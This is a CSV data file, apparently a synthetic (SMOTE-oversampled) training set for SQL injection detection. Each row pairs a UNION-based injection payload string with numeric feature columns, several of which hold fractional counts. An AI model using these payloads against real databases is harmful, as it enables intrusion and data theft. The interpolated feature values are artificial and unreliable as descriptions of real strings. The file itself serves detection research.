id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000033,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000102,0.0931376943976502,71.67775379693425,27.099669676019744,4.204969324961046,37.0,9.538216250506618,15.039867870407898,10.099669676019744,0.5177629925571338,0.13106821859336842,0.21028360990542547,0.14088517894407235,3.0,0.0,2.019933935203949,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0797357408157953,5.019933935203949,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.01993393520394887,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.019933935203949
SMOTE_000034,attack,union,"-5934' union all select 6096,6096,6096,6096,6096#",nearest_attack_euclidean,R000174,1.285442061893982,44.43000687383653,20.584546079439683,3.9331391291483455,14.0,20.676368635517473,4.0,5.753638238319054,0.3200751362869434,0.4612362503589042,0.09145003893912668,0.12723857441502573,0.5845460794396843,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.169092158879369,1.0,0.5845460794396844,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000035,attack,union,"-8950""   )    )    as uahs where 2113  =  2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",nearest_attack_euclidean,R000054,0.5518722984209067,114.15237054287951,26.847629457120483,3.7322102807069606,25.0,52.0,22.0,15.152370542879515,0.21900768393806344,0.455535982591172,0.19272676186549584,0.13272957160526863,0.0,1.0,1.3047410857590294,0.0,0.0,1.0,0.0,2.0,0.0,0.0,9.0,2.3047410857590296,0.0,1.0,0.15237054287951468,0.8476294571204852,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000036,attack,union,"1' union all select null,null#",nearest_attack_euclidean,R000078,0.30146611883037583,29.45228821276909,14.817429404256362,3.4851074888227442,21.634858808512725,1.0,4.0,2.8174294042563615,0.7348547549645302,0.03409404414893183,0.1363761765957273,0.09467502429081058,0.9087147021281814,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9087147021281816,0.0,0.9087147021281814,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,union,"1 where 4477  =  4477 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000139,1.339399748953105,90.41633806356744,21.24901419070232,3.5171420098679054,59.0,9.0,10.0,12.416338063567439,0.6525562947801613,0.09954248564443138,0.11060276182714598,0.13729845774826133,0.0,0.4163380635674389,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,9.0,3.0,0.0,0.4163380635674389,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000038,attack,union,"-4135'   )    )     )   union all select 4413,4413,4413#",nearest_attack_euclidean,R000291,0.35380075566686814,53.50591037908762,20.0,3.5611788234655553,14.0,14.66981886884673,17.334909434423366,7.501182075817523,0.26520786354214865,0.27065125896777653,0.3247598177282802,0.13938105976179457,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.833727358605841,0.0,0.0,1.6674547172116827,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000039,attack,union,"-4596"" union all select 5761#",nearest_attack_euclidean,R000136,1.047239461070515,30.435787517057044,20.717893758528525,4.140857280858871,14.0,8.0,4.957191678038033,3.4785958390190164,0.46295465493714416,0.2645455171069395,0.15962109221169926,0.11287873574421707,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.23929791950950807,0.23929791950950807,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.23929791950950813,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R000273,0.6322805393212891,60.6986891100592,23.3013108899408,3.9045564917598194,27.384269320710395,12.314419789348804,14.0,7.0,0.45048663009603795,0.20352224184692466,0.2306607520380249,0.11533037601901246,1.0,0.0,2.3013108899408,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.6986891100591999,3.3013108899408,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000041,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000213,1.1346244557819973,69.23360848670454,17.0,3.2575805243771927,39.74950943149091,1.0,16.437377357872727,12.046721697340907,0.5718390189168713,0.014947583570861567,0.240119047939818,0.17309434957244918,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.6093443394681817,1.0,0.0,5.437377357872726,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000042,attack,union,"1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.5093898111671161,86.58761426190297,22.0,3.5990928047010935,55.0,9.0,10.587614261902967,12.0,0.6353593301802761,0.10396789039313609,0.12204892556907307,0.13862385385751477,0.853096434524258,0.0,2.0,0.0,0.0,1.0,0.0,0.14690356547574202,0.0,0.0,8.0,3.0,0.853096434524258,0.0,1.0,0.0,0.0,1.0,0.14690356547574202,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000043,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000087,0.8312493381225564,60.588057855586484,16.282388428882705,3.2018946194549684,43.74089256893837,1.0,5.129553715530813,10.717611571117297,0.7206804408367857,0.016528563142165692,0.08593098442008049,0.17686001160096804,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.282388428882703,1.0,0.0,6.4352231422345945,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.28238842888270305,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000113,0.6442068532141381,46.496200878039645,20.0,3.9901187034927648,14.0,20.396960702431713,4.0,8.099240175607928,0.31439164307871287,0.42273002830554457,0.0898261837367751,0.17305214487896747,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,3.099240175607928,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000045,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000216,1.1689542954130563,73.39877516782441,16.398775167824404,3.180932640154535,46.0,1.0,14.0,12.398775167824404,0.6267412703221172,0.013624810224393852,0.19074734314151395,0.16888657631197496,1.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.39877516782440475,0.0,7.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000046,attack,union,"-6659'  )   where 1256  =  1256 union all select 1256,1256--",nearest_attack_euclidean,R000160,0.4670874480849986,60.22258874962962,23.777411250370378,3.9523454251557912,21.671064995555465,17.551523754074157,14.0,7.0,0.3592991020465478,0.2919780465169008,0.23248190095770088,0.11624095047885045,1.0,0.0,2.777411250370378,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.222588749629622,3.777411250370378,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000205,0.823632262928666,72.10278955272278,17.0,3.165487840514399,47.794420894554435,1.0,11.308368658168353,12.0,0.6633734142151698,0.013871736532370671,0.15629401086401135,0.1664608383884481,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5513947763613922,1.0,0.0,7.448605223638608,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000048,attack,union,"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#",nearest_attack_euclidean,R000092,0.36662438257382995,72.01296496644892,21.30129649664489,3.5739735695413164,14.0,38.41037197315913,8.0,11.602592993289782,0.1951602440780986,0.5323516652643219,0.11152013947319918,0.1609679511843803,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.602592993289782,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,union,"-6440   )    )     )   union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",nearest_attack_euclidean,R000218,0.19560683323370587,89.36911517204436,19.0,3.414126224953176,14.0,42.69529213763549,18.0,14.673823034408873,0.15676365801065412,0.4775147606637973,0.20155327458512667,0.16416830674042193,0.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,8.673823034408873,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000050,attack,union," select * from users where id  =  1  <@. union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000035,0.8099057410420749,89.34837457072385,27.27362502525154,3.8071146435476555,45.08462482323923,2.2736250252515386,30.263749747484614,11.726374974748461,0.5053303576347702,0.026115501966316262,0.3367361308966105,0.13181800950230302,0.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,3.4527499494969223,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000051,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000036,1.905872886915666,75.89228580831548,25.10771419168453,3.8193624940400164,40.0,2.8922858083154708,24.0,9.0,0.5270716785381371,0.038094186667899904,0.3162430071228822,0.11859112767108082,0.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,2.0,0.0,0.10771419168452841,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000052,attack,union," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000020,1.9512460095014332,74.37970129387242,32.459900431290805,4.403662665258109,42.0,3.0,17.0,12.379701293872415,0.5648977191163227,0.04034983707973733,0.22864907678517823,0.16610336701876166,1.3797012938724151,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,1.0,6.0,0.459900431290805,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000053,attack,union,"1""   )    )    as xhat where 6674  =  6674 union all select null,null,null#",nearest_attack_euclidean,R000170,0.003523029161164988,75.02483521910519,24.004967043821036,3.8155988027679504,37.01986817528415,9.0,22.0,7.004967043821038,0.4934285350065699,0.11996274717134221,0.293242270863281,0.09336644695880691,0.0,1.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,2.004967043821037,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000054,attack,union,"-9959""  )   where 7073  =  7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",nearest_attack_euclidean,R000192,0.038907082012979675,88.70790643510102,25.038945808653196,3.7232002197261345,19.0,43.76632514808081,14.0,11.941581287020202,0.21432580894823575,0.49317568403199935,0.15792428027764738,0.1345742267421175,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.941581287020204,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000055,attack,union,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",nearest_attack_euclidean,R000090,0.04238607252521514,73.69649984044658,20.060700031910685,3.4328051050102832,14.0,43.75719987235726,4.0,11.939299968089315,0.19002134787186603,0.5936911080248313,0.05429181367767602,0.16199573042562682,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.939299968089315,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000056,attack,union,"-4596"" union all select 5761#",nearest_attack_euclidean,R000136,1.0426339359822479,30.429473244460354,20.714736622230177,4.140863604590271,14.0,8.0,4.952982162973566,3.476491081486783,0.463041748352271,0.2645952847727263,0.15952570418560794,0.11283726268939476,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.23824554074339166,0.23824554074339188,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.23824554074339183,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000175,0.03947998621750274,84.32982430069441,17.0,3.160358818108393,50.26385944055552,1.0,18.0,15.06596486013888,0.5959969205419935,0.01186064415453525,0.21349159478163465,0.17865084052183655,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,8.065964860138882,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000058,attack,union,1 union all select null#,nearest_attack_euclidean,R000283,2.0639290072088143,31.72860401283976,14.595109488649086,3.4798757975633707,23.437162407703855,0.4493886860811358,6.044498174730223,1.7975547443245432,0.790188899930766,0.00881154286433597,0.165753385747554,0.035246171457344,0.44938868608113586,0.0,0.0,0.0,0.0,0.0,0.0,0.4493886860811358,0.0,0.0,0.4493886860811358,0.0,0.44938868608113597,0.0,0.0,0.4493886860811358,0.0,0.0,0.44938868608113586,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000059,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000178,1.2542517583988286,78.57685934558144,26.61859505453488,3.9203079330634503,21.28842967279072,33.52561978186048,14.762809890930239,9.0,0.26970199060660993,0.42715844827138116,0.1879905564253139,0.11514900469669502,0.0,0.6185950545348804,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.381404945465119,2.0,0.0,0.6185950545348804,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000060,attack,union,"-7371'  )   union all select 4531,4531,4531#",nearest_attack_euclidean,R000046,0.21893558786488113,45.44339236910656,21.28867847382131,4.055103433392555,14.0,17.154713895285248,8.0,6.288678473821312,0.308809140460347,0.37649032165438123,0.17646236597734116,0.13823817190793058,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.288678473821312,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000061,attack,union,"1  )   union all select null,null--",nearest_attack_euclidean,R000108,0.24320662802066703,34.605442567330016,15.0,3.4088295655531082,21.605442567330016,1.0,8.0,4.0,0.6238440123274565,0.02893507597481107,0.23148060779848836,0.11574030389924418,0.09863935816749603,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.901360641832504,2.0,0.09863935816749603,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000062,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000043,0.06477147121511759,72.11885594421223,16.01980932403537,3.1232190613844684,46.0,1.0,14.079237296141486,11.039618648070743,0.6379153537333044,0.0138677250811588,0.19516401390726776,0.15305290727826906,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0198093240353714,0.01980932403537118,0.0,7.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000063,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000097,0.016066359210503995,65.89005624463083,21.021988751073835,3.8036663938125175,14.0,27.912044995704658,14.0,9.978011248926164,0.2125376657400348,0.423504706403367,0.21253766574003477,0.1514199621165635,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,4.9780112489261645,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000064,attack,union," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000005,0.0026765383885235835,77.98020450560138,27.0,3.9180122629874776,40.0,2.990102252800691,23.990102252800693,11.0,0.5129540856572106,0.03834132290851042,0.307642217878546,0.14106237355573292,0.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000065,attack,union,"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",nearest_attack_euclidean,R000196,0.8904413766367651,78.52892692398193,21.367768269004518,3.5609006824886453,14.0,38.52892692398193,14.0,12.0,0.1783873393197784,0.4903218876577758,0.17838733931977846,0.15290343370266724,0.3677682690045183,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.632231730995481,1.0,0.3677682690045183,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
